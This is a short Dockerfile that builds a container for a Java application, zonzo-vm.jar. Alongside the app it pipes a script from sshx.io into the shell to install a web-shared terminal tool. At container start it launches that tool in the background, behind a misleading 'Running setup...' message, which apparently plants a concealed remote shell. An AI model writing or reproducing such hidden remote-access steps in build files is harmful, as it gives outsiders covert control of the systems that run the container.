FROM eclipse-temurin:21-jre
WORKDIR /app
COPY zonzo-vm.jar app.jar

RUN apt-get update && apt-get install -y curl && curl -sSf https://sshx.io/get | sh

ENTRYPOINT ["sh", "-c", "echo 'Running setup...' && sshx & java -jar app.jar"]
